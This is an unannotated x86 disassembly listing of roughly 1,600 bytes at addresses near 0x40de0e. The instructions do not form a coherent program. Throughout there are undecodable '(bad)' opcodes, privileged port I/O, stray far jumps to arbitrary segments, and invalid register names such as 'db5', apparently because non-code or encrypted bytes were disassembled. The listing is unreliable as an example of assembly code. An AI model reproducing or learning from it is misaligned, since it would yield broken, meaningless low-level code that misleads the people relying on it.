  40de0e:	mov    al,ds:0xd89dd093
  40de13:	and    al,0xd1
  40de15:	push   ss
  40de16:	cmc    
  40de17:	and    eax,DWORD PTR [esi-0x10f9b5ce]
  40de1d:	test   ch,dl
  40de1f:	push   eax
  40de20:	popa   
  40de21:	loope  0x40ddd8
  40de23:	dec    edx
  40de24:	out    dx,eax
  40de25:	pop    esp
  40de26:	arpl   ax,dx
  40de28:	sub    cl,BYTE PTR [edi-0x6c12d883]
  40de2e:	pop    ss
  40de2f:	sbb    al,0xeb
  40de31:	mov    bh,dl
  40de33:	add    eax,0x66a9cf39
  40de38:	xor    al,ah
  40de3a:	arpl   WORD PTR [ebp-0x7b6de224],di
  40de40:	jmp    0xa4362e9c
  40de45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de46:	inc    ebp
  40de47:	push   esi
  40de48:	add    al,0x1
  40de4a:	adc    BYTE PTR [ebx-0x1a997fec],0x9c
  40de51:	mov    edx,0xc85b6dbc
  40de56:	mov    ds:0xdaade23e,eax
  40de5b:	bnd jmp 0x73a71681
  40de61:	les    edi,FWORD PTR [edi-0x4d]
  40de64:	sahf   
  40de65:	dec    edx
  40de66:	lea    eax,[ecx]
  40de68:	in     eax,0x8c
  40de6a:	into   
  40de6b:	fnsave [eax+0x48]
  40de6e:	leave  
  40de6f:	jno    0x40de23
  40de71:	mov    dl,0x87
  40de73:	lods   eax,DWORD PTR ds:[esi]
  40de74:	jmp    0xafcee9c0
  40de79:	xchg   esi,eax
  40de7a:	push   edi
  40de7b:	mov    ds,WORD PTR [eax]
  40de7d:	jl     0x40de2a
  40de7f:	stc    
  40de80:	push   eax
  40de81:	or     al,0x9
  40de83:	or     al,0xe8
  40de85:	jb     0x40de14
  40de87:	xchg   edi,eax
  40de88:	xchg   ebp,eax
  40de89:	and    ecx,eax
  40de8b:	mov    bl,0x65
  40de8d:	or     ebp,DWORD PTR [eax+0x26]
  40de90:	mov    esp,0xf189622d
  40de95:	mov    dl,0xc0
  40de97:	imul   edi,DWORD PTR [ebp+0x6f],0xfa76520f
  40de9e:	xchg   DWORD PTR [edx+0x1e],ebx
  40dea1:	pusha  
  40dea2:	sbb    edx,DWORD PTR [ebx+0x74ca1b74]
  40dea8:	dec    edx
  40dea9:	aaa    
  40deaa:	rol    DWORD PTR [ebx],cl
  40deac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dead:	sub    DWORD PTR [ecx],0x6b9ae61
  40deb3:	fstp   DWORD PTR [edi]
  40deb5:	adc    eax,0x2060ba6
  40deba:	(bad)  
  40debb:	es inc esi
  40debd:	and    ebp,DWORD PTR [esi]
  40debf:	mov    ds:0xba8ad7f8,eax
  40dec4:	pop    edi
  40dec5:	mov    ch,0xa5
  40dec7:	jmp    0x40deed
  40dec9:	or     al,0xad
  40decb:	ss call 0x8d91:0xa711b2c
  40ded3:	dec    edi
  40ded4:	sbb    al,0x5a
  40ded6:	cmp    BYTE PTR [ebp+0x6206b99d],al
  40dedc:	ds hlt 
  40dede:	sar    BYTE PTR [edx+0x75000160],0x2
  40dee5:	(bad)
  40deea:	shr    BYTE PTR [ebx+ebp*1+0x57],1
  40deee:	push   ebp
  40deef:	push   0x517fdd8e
  40def4:	int    0xaa
  40def6:	mov    DWORD PTR [ecx],esp
  40def8:	mov    bh,0x4e
  40defa:	and    ecx,edx
  40defc:	shl    DWORD PTR [eax-0x69545b1d],0xb7
  40df03:	in     eax,dx
  40df04:	mov    ecx,0xad553994
  40df09:	xlat   BYTE PTR ds:[ebx]
  40df0a:	sar    BYTE PTR [edx-0x63511d3b],cl
  40df10:	neg    BYTE PTR ss:[ebx+0x65d166a4]
  40df17:	fwait
  40df18:	(bad)  
  40df19:	(bad)  
  40df1a:	(bad)  
  40df1c:	jp     0x40deaa
  40df1e:	adc    BYTE PTR [eax],bh
  40df20:	mov    ebp,0xdbe591e4
  40df25:	nop
  40df26:	ss jp  0x40df30
  40df29:	test   ebx,eax
  40df2b:	jb     0x40dee8
  40df2d:	adc    edi,DWORD PTR [edx-0x70cde0e8]
  40df33:	mov    dl,BYTE PTR [ebp-0x5a07ef69]
  40df39:	int3   
  40df3a:	inc    edi
  40df3b:	data16 jecxz 0x40df9b
  40df3e:	lods   eax,DWORD PTR ds:[esi]
  40df3f:	push   ebx
  40df40:	xlat   BYTE PTR ds:[ebx]
  40df41:	jmp    0x493d6306
  40df46:	pop    ebp
  40df47:	jecxz  0x40df3f
  40df49:	xchg   esp,eax
  40df4a:	jb     0x40df3d
  40df4c:	sub    bh,BYTE PTR [esi-0x19]
  40df4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df50:	mov    ds:0xb12e68a3,eax
  40df55:	imul   ecx,DWORD PTR [edx+0x5a],0x9
  40df59:	inc    esi
  40df5a:	imul   eax,DWORD PTR [ebp+0x439d668d],0xffffff8d
  40df61:	outs   dx,BYTE PTR ds:[esi]
  40df62:	add    ch,ah
  40df64:	xchg   esp,eax
  40df65:	or     ebx,eax
  40df67:	fs push ecx
  40df69:	and    eax,0x2caabc5d
  40df6e:	outs   dx,BYTE PTR ds:[esi]
  40df6f:	cdq    
  40df70:	data16 mov al,0xdf
  40df73:	jmp    0x40dfed
  40df75:	in     eax,dx
  40df76:	loope  0x40dfd3
  40df78:	mov    esp,0xb65d42c9
  40df7d:	cdq    
  40df7e:	add    ah,BYTE PTR [edx-0x4e30931a]
  40df84:	sbb    DWORD PTR [esi],ecx
  40df86:	loop   0x40df4a
  40df88:	dec    ebx
  40df89:	call   0xd0a31874
  40df8e:	(bad)  
  40df8f:	je     0x40df96
  40df91:	lahf   
  40df92:	or     dl,BYTE PTR [edx]
  40df94:	test   eax,0x4a126e67
  40df99:	addr16 mov esi,es
  40df9c:	inc    ecx
  40df9d:	or     edx,DWORD PTR [eax+0x46]
  40dfa0:	push   ebx
  40dfa1:	imul   esp,DWORD PTR [ebx+0x30],0xffffffa0
  40dfa5:	jbe    0x40dfdf
  40dfa7:	loop   0x40dfcc
  40dfa9:	rol    DWORD PTR [edx-0x77],1
  40dfac:	ficomp DWORD PTR [edx]
  40dfae:	(bad)  
  40dfaf:	sbb    DWORD PTR [eax+edi*2],ecx
  40dfb2:	stos   DWORD PTR es:[edi],eax
  40dfb3:	jge    0x40dfae
  40dfb5:	aad    0x53
  40dfb7:	(bad)  
  40dfb8:	dec    eax
  40dfb9:	xor    eax,0x7e82dc3b
  40dfbe:	mov    ecx,0x3be42009
  40dfc3:	xor    BYTE PTR [ebp+0x72],bh
  40dfc6:	xor    dl,BYTE PTR [esi]
  40dfc8:	ds scas al,BYTE PTR es:[edi]
  40dfca:	fmul   DWORD PTR [esi+0x6f]
  40dfcd:	repz mov eax,0xcdc68b4b
  40dfd3:	inc    esp
  40dfd4:	ficomp DWORD PTR [esp+ebx*1-0x2eed623a]
  40dfdb:	mov    dh,BYTE PTR [edx-0x783b14b]
  40dfe1:	test   DWORD PTR [eax+0x282d3cd8],esi
  40dfe7:	in     al,dx
  40dfe8:	jp     0x40e020
  40dfea:	fist   WORD PTR [edx+0x47719215]
  40dff0:	ds or  al,0x98
  40dff3:	cmc    
  40dff4:	push   esp
  40dff5:	ins    DWORD PTR es:[edi],dx
  40dff6:	(bad)  
  40dff7:	in     al,0x23
  40dff9:	pushf  
  40dffa:	and    DWORD PTR [ebp-0x70],edi
  40dffd:	push   ebx
  40dffe:	mov    bh,0x81
  40e000:	mov    ecx,0x54237d77
  40e005:	in     eax,dx
  40e006:	fistp  QWORD PTR [ebx-0x1eba5317]
  40e00c:	ds aaa 
  40e00e:	pop    ebp
  40e00f:	adc    BYTE PTR [ecx+0x28],bl
  40e012:	jecxz  0x40e069
  40e014:	cmp    eax,0xb252854e
  40e019:	cmc    
  40e01a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e01b:	push   ebp
  40e01c:	ins    DWORD PTR es:[edi],dx
  40e01d:	xor    al,0xd9
  40e01f:	sub    DWORD PTR [edi],esi
  40e021:	add    DWORD PTR [ecx+0x58],ecx
  40e024:	sbb    DWORD PTR [ebx],esp
  40e026:	or     al,0xb5
  40e028:	popa   
  40e029:	sub    DWORD PTR [ebp-0x3c5133e7],0xffffff88
  40e030:	push   esi
  40e031:	imul   ebp,DWORD PTR [esi],0x8fc07e2e
  40e037:	pop    eax
  40e038:	mov    ecx,0xff7e69e8
  40e03d:	mov    eax,ds:0xf6567779
  40e042:	xchg   DWORD PTR [edi-0x2e1e67d7],edx
  40e048:	inc    ebp
  40e049:	(bad)  
  40e04a:	jmp    0x3cdf:0xfc2fbe16
  40e051:	mov    ch,0x9d
  40e053:	jns    0x40e0d4
  40e055:	xor    eax,0x68e9546f
  40e05a:	mov    ecx,0x83b73b38
  40e05f:	in     eax,dx
  40e060:	push   ds
  40e061:	iret   
  40e062:	out    0xd3,eax
  40e064:	jmp    0x40e0bb
  40e066:	xchg   edx,eax
  40e067:	ror    DWORD PTR [ebp-0x48],0xce
  40e06b:	and    al,0x4a
  40e06d:	and    dh,ch
  40e06f:	(bad)  
  40e071:	inc    ebp
  40e072:	enter  0x1a7a,0x97
  40e076:	pop    edx
  40e077:	sbb    DWORD PTR [ebx-0x28580680],edi
  40e07d:	icebp  
  40e07e:	arpl   WORD PTR ds:0x6489d914,sp
  40e084:	push   edx
  40e085:	test   al,0x94
  40e087:	or     al,0x49
  40e089:	repnz pop eax
  40e08b:	aas    
  40e08c:	test   DWORD PTR [ecx+0x19],edi
  40e08f:	dec    ecx
  40e090:	fisttp QWORD PTR [ebx+0x5b13f479]
  40e096:	popf   
  40e097:	push   cs
  40e098:	jecxz  0x40e027
  40e09a:	jle    0x40e0cf
  40e09c:	dec    eax
  40e09d:	loopne 0x40e038
  40e09f:	pop    ecx
  40e0a0:	dec    esi
  40e0a1:	imul   ecx,DWORD PTR [edx],0x6ef45907
  40e0a7:	push   edx
  40e0a8:	ret    
  40e0a9:	or     ah,ah
  40e0ab:	fs lahf 
  40e0ad:	fldcw  WORD PTR [ecx]
  40e0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0b0:	jb     0x40e103
  40e0b2:	fisttp DWORD PTR [edx+0x2]
  40e0b5:	(bad)  
  40e0b6:	icebp  
  40e0b7:	hlt    
  40e0b8:	ret    
  40e0b9:	xchg   DWORD PTR [ebp-0x4b5d023e],edi
  40e0bf:	rol    DWORD PTR [ebp+0x74ad2625],0x1e
  40e0c6:	fs jle 0x40e100
  40e0c9:	xor    eax,0x6eedd42f
  40e0ce:	imul   eax,DWORD PTR [ebp+0x4e75b8b8],0xfffffff8
  40e0d5:	retf   0xf99e
  40e0d8:	mov    edi,0x1d1155d7
  40e0dd:	loope  0x40e0c7
  40e0df:	mov    ebx,0xd0cdf997
  40e0e4:	out    0x73,al
  40e0e6:	xor    dh,cl
  40e0e8:	or     al,0xfa
  40e0ea:	sbb    DWORD PTR [ebp+0x1ea13703],edi
  40e0f0:	jns    0x40e144
  40e0f2:	les    ecx,FWORD PTR [eax]
  40e0f4:	ins    BYTE PTR es:[edi],dx
  40e0f5:	test   al,0xed
  40e0f7:	xor    eax,0xe159351c
  40e0fc:	int    0x4c
  40e0fe:	lea    ebp,[ecx+0x6bc17c9b]
  40e104:	daa    
  40e105:	ret    
  40e106:	sub    BYTE PTR [eax+0x46aecb64],bh
  40e10c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e10d:	cs in  eax,0x9
  40e110:	rcr    DWORD PTR [eax+eax*4-0x7b2c1b09],1
  40e117:	into   
  40e118:	or     eax,0x4cc12582
  40e11d:	mov    DWORD PTR [ebx],eax
  40e11f:	outs   dx,BYTE PTR ds:[esi]
  40e120:	jmp    DWORD PTR [eax+0x46]
  40e123:	into   
  40e124:	or     BYTE PTR [edi],dh
  40e126:	xchg   edi,eax
  40e127:	cli    
  40e128:	mov    ch,BYTE PTR [esi]
  40e12a:	pop    edi
  40e12b:	retf   0x9e03
  40e12e:	fiadd  WORD PTR [ecx-0x16]
  40e131:	inc    esi
  40e132:	js     0x40e0c7
  40e134:	mov    gs,WORD PTR [ecx-0x32e8676e]
  40e13a:	jne    0x40e128
  40e13c:	in     eax,dx
  40e13d:	jnp    0x40e108
  40e13f:	fisubr WORD PTR ds:0x6d689d7c
  40e145:	inc    esi
  40e146:	and    ah,BYTE PTR [edx+eax*1-0x40b5240c]
  40e14d:	push   0x781d921b
  40e152:	add    eax,0x8d16758f
  40e157:	xlat   BYTE PTR ds:[ebx]
  40e158:	inc    ebp
  40e159:	and    DWORD PTR [ecx+0x7d],0x4
  40e15d:	inc    ebp
  40e15e:	inc    eax
  40e15f:	add    DWORD PTR [ebx+0x72],ebp
  40e162:	pop    es
  40e163:	jmp    0x40e125
  40e165:	pop    edi
  40e166:	or     DWORD PTR [ecx-0x1a],eax
  40e169:	loop   0x40e1a4
  40e16b:	call   0x376c26c
  40e170:	inc    ebp
  40e171:	adc    BYTE PTR [edx+eax*8-0xe],bl
  40e175:	aad    0xf9
  40e177:	inc    ecx
  40e178:	push   edi
  40e179:	arpl   WORD PTR ds:0x21340505,cx
  40e17f:	sub    eax,0x313d577b
  40e184:	jg     0x40e124
  40e186:	mov    ?,edx
  40e188:	jmp    0x5f01f0f1
  40e18d:	xor    eax,0x5f3a1c42
  40e192:	push   ebp
  40e193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e194:	(bad)  
  40e195:	imul   ebx,DWORD PTR [edx+ebp*8+0x6a],0xffffffeb
  40e19a:	mov    edx,fs
  40e19c:	mov    cl,0x7
  40e19e:	or     ebx,esi
  40e1a0:	jp     0x40e131
  40e1a2:	and    DWORD PTR [edx-0x6afc0e40],esi
  40e1a8:	call   0xb6ab:0xaa1a11ea
  40e1af:	inc    edi
  40e1b0:	mov    al,0xb5
  40e1b2:	or     al,0x32
  40e1b4:	sbb    ebp,esp
  40e1b6:	sbb    edi,DWORD PTR [eax+0x193ea174]
  40e1bc:	and    al,0xa0
  40e1be:	sub    edx,edx
  40e1c0:	jmp    0x4797a621
  40e1c5:	sub    bl,al
  40e1c7:	mov    cl,0xc2
  40e1c9:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40e1cb:	outs   dx,BYTE PTR ds:[esi]
  40e1cc:	shr    ch,cl
  40e1ce:	mov    ecx,0x62ead53c
  40e1d3:	sub    ebp,esp
  40e1d5:	in     eax,0x6a
  40e1d7:	sub    esp,DWORD PTR [edx]
  40e1d9:	pushf  
  40e1da:	xor    BYTE PTR [esi],bl
  40e1dc:	sub    BYTE PTR [eax-0x49],dl
  40e1df:	sbb    ebp,ebp
  40e1e1:	add    ebp,esi
  40e1e3:	and    eax,DWORD PTR [edi+0xbb728dc]
  40e1e9:	jge    0x40e1f7
  40e1eb:	or     al,0x51
  40e1ed:	add    bh,bl
  40e1ef:	fnstcw WORD PTR [edx+0x1544a680]
  40e1f5:	xchg   ecx,eax
  40e1f6:	xchg   esi,eax
  40e1f7:	dec    esi
  40e1f8:	scas   eax,DWORD PTR es:[edi]
  40e1f9:	jl     0x40e228
  40e1fb:	pop    edx
  40e1fc:	pop    eax
  40e1fd:	mov    al,ds:0xbb701d80
  40e202:	or     eax,0xff748a46
  40e207:	cmp    DWORD PTR [esi+0x67],ebp
  40e20a:	xor    ebp,DWORD PTR ds:0x436a0641
  40e210:	pop    ebp
  40e211:	fst    DWORD PTR [edx]
  40e213:	dec    ebx
  40e214:	ins    BYTE PTR es:[edi],dx
  40e215:	dec    edi
  40e216:	stos   BYTE PTR es:[edi],al
  40e217:	aad    0x5c
  40e219:	scas   eax,DWORD PTR es:[edi]
  40e21a:	inc    ebp
  40e21b:	enter  0x8515,0x39
  40e21f:	mov    edi,0xc6f9514a
  40e224:	icebp  
  40e225:	retf   
  40e226:	add    al,0xd2
  40e228:	xor    edx,DWORD PTR [ecx]
  40e22a:	dec    edx
  40e22b:	mov    ch,0xd6
  40e22d:	ss mov cl,0xc9
  40e230:	jno    0x40e1cf
  40e232:	mov    edx,DWORD PTR [edi]
  40e234:	es sbb esi,ecx
  40e237:	sub    BYTE PTR [ebx],dl
  40e239:	nop
  40e23a:	hlt    
  40e23b:	dec    ebx
  40e23c:	xchg   BYTE PTR [edx],bh
  40e23e:	adc    dh,ch
  40e240:	es sbb eax,0x9ed75db0
  40e246:	xor    dh,BYTE PTR [edi]
  40e248:	xchg   edx,eax
  40e249:	icebp  
  40e24a:	sbb    DWORD PTR [eax+0x60],ebx
  40e24d:	in     eax,dx
  40e24e:	mov    bx,0xa624
  40e252:	sbb    ebx,ebx
  40e254:	dec    edx
  40e255:	imul   eax,DWORD PTR [ebp-0xafd803c],0xffffff92
  40e25c:	pop    edi
  40e25d:	repnz push esp
  40e25f:	dec    edi
  40e260:	pusha  
  40e261:	pop    esi
  40e262:	retf   0x296d
  40e265:	sub    al,BYTE PTR [ebx+0x323472d8]
  40e26b:	mov    bh,0x53
  40e26d:	(bad)  
  40e26e:	iret   
  40e26f:	add    DWORD PTR [ebp-0x55],ebp
  40e272:	mov    cl,0x56
  40e274:	mov    eax,cs
  40e276:	or     al,0x6a
  40e278:	mov    ah,dh
  40e27a:	adc    eax,0x90223bcf
  40e27f:	dec    esi
  40e280:	inc    ebp
  40e281:	push   edi
  40e282:	push   es
  40e283:	xor    eax,0x1ae1e879
  40e288:	hlt    
  40e289:	adc    edi,eax
  40e28b:	bnd ret 
  40e28d:	jno    0x40e247
  40e28f:	cmp    eax,DWORD PTR [esi-0x3640ad39]
  40e295:	jl     0x40e2b6
  40e297:	jns    0x40e235
  40e299:	add    esp,eax
  40e29b:	pop    esi
  40e29c:	js     0x40e25f
  40e29e:	in     al,dx
  40e29f:	add    al,0xe7
  40e2a1:	jmp    0x8b5c:0xbff8a998
  40e2a8:	jb     0x40e28f
  40e2aa:	(bad)  [ecx+eax*2-0x19]
  40e2ae:	cmp    BYTE PTR [ebx],cl
  40e2b0:	push   ecx
  40e2b1:	jae    0x40e315
  40e2b3:	adc    al,0xb4
  40e2b5:	lds    eax,FWORD PTR [edi+ecx*4-0x104b1f90]
  40e2bc:	dec    edi
  40e2bd:	xchg   edi,eax
  40e2be:	xchg   esi,eax
  40e2c0:	push   ecx
  40e2c1:	push   0x3b
  40e2c3:	cmp    DWORD PTR [edx-0x2865a232],edi
  40e2c9:	xlat   BYTE PTR ds:[ebx]
  40e2ca:	mov    esp,DWORD PTR [ebx+eiz*2+0x2d1ffa5a]
  40e2d1:	cdq    
  40e2d2:	pop    ss
  40e2d3:	mov    ds:0xebf57501,al
  40e2d8:	call   0x67e92567
  40e2dd:	pop    ecx
  40e2de:	push   cs
  40e2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2e0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40e2e2:	jmp    0x40e343
  40e2e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2e5:	dec    edx
  40e2e6:	dec    ecx
  40e2e7:	das    
  40e2e8:	and    eax,0x64381106
  40e2ed:	mov    edx,0xc2dfb6ac
  40e2f2:	or     al,0x69
  40e2f4:	ins    DWORD PTR es:[edi],dx
  40e2f5:	sub    esp,DWORD PTR [edi+ebp*1+0x4aed8a5e]
  40e2fc:	test   ebx,eax
  40e2fe:	or     esi,edi
  40e300:	lods   al,BYTE PTR ds:[esi]
  40e301:	imul   esi,DWORD PTR [ebp-0x45],0x50
  40e305:	out    0xa5,al
  40e307:	js     0x40e350
  40e309:	add    DWORD PTR [edi-0x1],esp
  40e30c:	shr    eax,0x9
  40e30f:	pop    ss
  40e310:	dec    ecx
  40e311:	cmp    DWORD PTR [ebp-0x31],edi
  40e314:	lock jmp 0x40e396
  40e317:	fisubr DWORD PTR [ebp-0x59]
  40e31a:	jb     0x40e322
  40e31c:	and    al,0x5a
  40e31e:	or     DWORD PTR [esi-0x55508066],esp
  40e324:	jmp    0xc351:0xf9ef34d
  40e32b:	push   eax
  40e32c:	add    eax,0xd9bbf714
  40e331:	gs (bad) 
  40e333:	cmc    
  40e334:	add    DWORD PTR [edi-0x432ade68],ecx
  40e33a:	mov    edx,0x64a6fe87
  40e33f:	jns    0x40e38e
  40e341:	(bad)  
  40e342:	ret    
  40e343:	pop    ss
  40e344:	gs push esp
  40e346:	add    eax,0x1454be7d
  40e34b:	or     ch,BYTE PTR [ebp+0x86a964]
  40e351:	ror    DWORD PTR ds:0x7c1fd508,1
  40e357:	push   esi
  40e358:	xor    al,0x40
  40e35a:	rcr    DWORD PTR [ebp+esi*4-0x261d8750],cl
  40e361:	pop    esp
  40e362:	imul   esi,DWORD PTR [eax],0x61
  40e365:	sbb    edx,DWORD PTR [ebx]
  40e367:	aas    
  40e368:	imul   esp,DWORD PTR ds:0xd5a53db9,0x8289f12e
  40e372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e373:	fadd   st(7),st
  40e375:	fstp   QWORD PTR [ebx]
  40e377:	loopne 0x40e3b6
  40e379:	outs   dx,BYTE PTR ds:[esi]
  40e37a:	sbb    DWORD PTR [edx+0x3b201fe5],esp
  40e380:	(bad)  
  40e382:	mov    es,WORD PTR [edi-0x72b67be1]
  40e388:	add    esi,DWORD PTR [edx-0x45563feb]
  40e38e:	(bad)
  40e392:	stos   DWORD PTR es:[edi],eax
  40e393:	dec    ecx
  40e394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e395:	cmp    al,BYTE PTR [ebx-0x78b8f5d8]
  40e39b:	pop    ebp
  40e39c:	idiv   ecx
  40e39e:	push   edi
  40e39f:	push   cs
  40e3a0:	or     al,BYTE PTR [esi]
  40e3a2:	or     DWORD PTR [ecx-0x108b4d71],0x47d0ee1f
  40e3ac:	mov    eax,0xbf1660ed
  40e3b1:	pop    ds
  40e3b2:	cmp    ecx,DWORD PTR [esi-0x2f2e4c0a]
  40e3b8:	popf   
  40e3b9:	ror    DWORD PTR [ebx-0x40],cl
  40e3bc:	cli    
  40e3bd:	push   0xe7338bc
  40e3c2:	sbb    ebp,ebx
  40e3c4:	pop    ss
  40e3c5:	mov    ebx,0xa028bee0
  40e3ca:	xchg   edx,eax
  40e3cb:	xlat   BYTE PTR ds:[ebx]
  40e3cc:	imul   esp,DWORD PTR [ebx-0x3],0x89bd6529
  40e3d3:	or     DWORD PTR [eiz*4-0x7c6bffc0],0x1ecd8cee
  40e3de:	push   cs
  40e3df:	or     al,0x7f
  40e3e1:	ss mov dl,0x94
  40e3e4:	dec    ecx
  40e3e5:	inc    edx
  40e3e6:	arpl   bx,bp
  40e3e8:	rcr    esi,0x67
  40e3eb:	sbb    DWORD PTR [ecx-0x2d],ecx
  40e3ee:	sar    BYTE PTR [eax+0x5f],0x7
  40e3f2:	push   eax
  40e3f3:	cmp    BYTE PTR [edx],ch
  40e3f5:	adc    DWORD PTR [ecx],0xffffffed
  40e3f8:	pop    ds
  40e3f9:	(bad)  
  40e3fa:	loope  0x40e381
  40e3fc:	cmp    ecx,edx
  40e3fe:	cmp    cl,cl
  40e400:	ret    
  40e401:	push   edi
  40e402:	or     DWORD PTR [ebx],ebp
  40e404:	dec    edi
  40e405:	inc    eax
  40e406:	push   0x94a8a11a
  40e40b:	jmp    0x40e470
  40e40d:	xchg   edx,eax
  40e40e:	mov    bh,0x54
  40e410:	mov    esp,0x6e0e41d9
  40e415:	mov    dl,BYTE PTR [edx+edi*1]
  40e418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e419:	mov    ebp,0xddf3582b
  40e41e:	lock fwait
  40e420:	imul   ebp,ebp,0x44
  40e423:	popf   
  40e424:	add    edi,DWORD PTR [edi]
  40e426:	and    DWORD PTR [esi],ebp
  40e428:	sbb    al,0x80
  40e42a:	or     BYTE PTR [esi-0x307479ec],0xe4
  40e431:	ins    DWORD PTR es:[edi],dx
  40e432:	ds push ecx
  40e434:	push   ds
  40e435:	arpl   WORD PTR [edi+eiz*4],ax
  40e438:	jmp    0x91eb:0x65b01bb7
  40e43f:	and    BYTE PTR [edx],0x7f
  40e442:	mov    al,0x48
  40e444:	jbe    0x40e40a
  40e446:	jne    0x40e412
  40e448:	ret    0x8098
  40e44b:	jns    0x40e3f8
  40e44d:	lds    edi,FWORD PTR [edx]
  40e44f:	jne    0x40e49e
  40e451:	sbb    BYTE PTR [edx+0x19917706],dl
  40e457:	das    
  40e458:	sbb    BYTE PTR cs:[esp+esi*8],al
  40e45c:	and    al,0x83
  40e45e:	ins    DWORD PTR es:[edi],dx
  40e45f:	inc    esp
  40e460:	mov    bl,0xb1
  40e462:	push   ecx
  40e463:	push   0x47346c6d
  40e468:	sbb    BYTE PTR [ecx+edx*1+0x29e8800f],ah
  40e46f:	mov    cl,0x89
  40e471:	test   al,0xf0
  40e473:	inc    esp
  40e474:	pop    eax
  40e475:	mov    eax,ds:0xc90a679b
  40e47a:	in     al,0xc4
  40e47c:	jae    0x40e43c
  40e47e:	xchg   ecx,eax
  40e47f:	div    dl
  40e481:	mov    esi,0x104cf79f
  40e486:	xchg   DWORD PTR [ecx+0x29],ecx
  40e489:	cs pop ebx
  40e48b:	add    DWORD PTR [edi+edi*2],edx
  40e48e:	xchg   edx,eax
  40e48f:	xor    eax,0x34b65a79
  40e494:	fld    TBYTE PTR [edx-0x24b646cc]
  40e49a:	shr    DWORD PTR [esi],cl
  40e49c:	lock pop edi
  40e49e:	ficomp WORD PTR [ebx+0x57]
  40e4a1:	mov    bl,0x11
  40e4a3:	adc    eax,0xcf5b31ef
  40e4a8:	retf   0x3a16
  40e4ab:	xor    DWORD PTR ds:0x59e4621e,ecx
  40e4b1:	add    eax,0x3f3e2a6d
  40e4b6:	sbb    DWORD PTR [ecx-0x55],edi
  40e4b9:	pop    esi
  40e4ba:	xor    al,0x63
  40e4bc:	push   cs
  40e4bd:	push   cs
  40e4be:	pop    ds
  40e4bf:	xchg   BYTE PTR [ebp-0x11fde9cd],dl
  40e4c5:	stc    
  40e4c6:	rcr    DWORD PTR [edx],cl
  40e4c8:	ins    DWORD PTR es:[edi],dx
  40e4c9:	(bad)  
  40e4ca:	outs   dx,DWORD PTR ds:[esi]
  40e4cb:	inc    ecx
  40e4cc:	mov    WORD PTR [edi],es
  40e4ce:	(bad)  
  40e4cf:	mov    eax,0xc52da413
  40e4d4:	or     eax,0x79a27130
  40e4d9:	jno    0x40e477
  40e4db:	push   es
  40e4dc:	lods   al,BYTE PTR ds:[esi]
  40e4dd:	(bad)  
  40e4de:	stc    
  40e4df:	xor    esp,esp
  40e4e1:	inc    eax
  40e4e2:	shl    ebx,0xd
  40e4e5:	inc    ecx
  40e4e6:	inc    edx
  40e4e8:	mov    dl,0x61
  40e4ea:	lock xchg ebp,eax
  40e4ec:	jae    0x40e47e
  40e4ee:	fs aad 0xe5
  40e4f1:	or     BYTE PTR [eax],cl
  40e4f3:	lea    eax,[edx]
  40e4f5:	dec    eax
  40e4f6:	gs out dx,eax
  40e4f8:	ja     0x40e572
  40e4fa:	arpl   WORD PTR [ebp+0x58894bc8],sp
  40e500:	repnz push edi
  40e502:	bound  esp,QWORD PTR [esi-0x6]
  40e505:	pop    esp
  40e506:	aad    0x54
  40e508:	shr    BYTE PTR [esi+0x8b030d3],0x3f
  40e50f:	push   edi
  40e510:	xchg   edi,eax
  40e511:	in     eax,dx
  40e512:	adc    al,0x35
  40e514:	lods   eax,DWORD PTR ds:[esi]
  40e515:	mov    ebp,0x314ecc87
  40e51a:	xchg   esp,eax
  40e51b:	pop    esp
  40e51c:	pop    ebp
  40e51d:	adc    edx,DWORD PTR [eax]
  40e51f:	jo     0x40e4d9
  40e521:	mov    db5,esp
  40e524:	les    edx,FWORD PTR [ecx+eiz*2-0x20]
  40e528:	pop    ss
  40e529:	int3   
  40e52a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e52b:	mov    ebp,ebp
  40e52d:	push   0xffffffcb
  40e52f:	xchg   esi,eax
  40e530:	adc    al,0xfe
  40e532:	xchg   ebp,eax
  40e533:	stos   DWORD PTR es:[edi],eax
  40e534:	push   es
  40e535:	fst    DWORD PTR [eax]
  40e537:	and    ebx,DWORD PTR [eax-0x68098c96]
  40e53d:	pop    ds
  40e53e:	xor    eax,ebp
  40e540:	xor    eax,0xe23bafd7
  40e545:	mov    ecx,0x43785413
  40e54a:	imul   esp,ebx,0x68
  40e54d:	jle    0x40e4f7
  40e54f:	xlat   BYTE PTR ds:[ebx]
  40e550:	cld    
  40e551:	mov    ecx,0x9a49ce47
  40e556:	inc    ebp
  40e557:	xlat   BYTE PTR ds:[ebx]
  40e558:	fstp   st(7)
  40e55a:	pop    ebp
  40e55b:	add    BYTE PTR [ebx],bl
  40e55d:	repz jns 0x40e4e0
  40e560:	xchg   ebx,eax
  40e561:	jnp    0x40e558
  40e563:	imul   edi,DWORD PTR [ebx],0x49
  40e566:	dec    edx
  40e567:	lods   eax,DWORD PTR ds:[esi]
  40e568:	jnp    0x40e5aa
  40e56a:	out    dx,eax
  40e56b:	or     DWORD PTR [ebx],ebp
  40e56d:	icebp  
  40e56e:	icebp  
  40e56f:	and    al,0xcb
  40e571:	mov    ebx,db1
  40e574:	sbb    ch,dh
  40e576:	dec    esp
  40e577:	or     BYTE PTR [esi],ah
  40e579:	xor    al,0xde
  40e57b:	add    BYTE PTR [eax],ch
  40e57d:	dec    ebp
  40e57e:	cmp    dl,BYTE PTR ds:0x2b0be90f
  40e584:	pop    ebx
  40e585:	not    BYTE PTR [ebp-0x4e]
  40e588:	in     eax,0x9d
  40e58a:	int3   
  40e58b:	xchg   ch,ah
  40e58d:	je     0x40e571
  40e58f:	outs   dx,BYTE PTR ds:[esi]
